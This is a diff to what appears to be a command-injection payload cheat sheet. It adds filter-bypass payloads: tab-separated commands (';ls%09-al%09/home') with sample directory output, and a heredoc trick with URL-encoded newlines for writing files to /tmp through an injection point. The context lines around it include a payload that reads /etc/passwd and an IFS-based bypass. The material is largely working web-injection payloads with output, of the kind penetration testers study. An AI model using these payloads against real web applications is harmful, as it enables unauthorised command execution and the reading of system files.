@@ -96,6 +96,16 @@ Commands execution without spaces, $ or { } - Linux (Bash only)
 IFS=,;`cat<<<uname,-a`
 ```
 
+Tabs work as separators in web apps where spaces are removed.
+
+```powershell
+;ls%09-al%09/home
+drwxr-xr-x  4 root root  4096 Jan 10 13:34 .
+drwxr-xr-x 18 root root  4096 Jan 10 13:33 ..
+drwx------  2 root root 16384 Jan 10 13:31 lost+found
+drwxr-xr-x  4 test test  4096 Jan 13 08:30 test
+```
+
 Works on Windows only.
 
 ```powershell
@@ -107,6 +117,14 @@ ping%PROGRAMFILES:~10,-5%IP
 
 ```powershell
 something%0Acat%20/etc/passwd
+```
+
+You can also write files.
+
+```powershell
+;cat>/tmp/hi<<EOF%0ahello%0aEOF
+;cat</tmp/hi
+hello
 ```
 
 ### Bypass characters filter via hex encoding
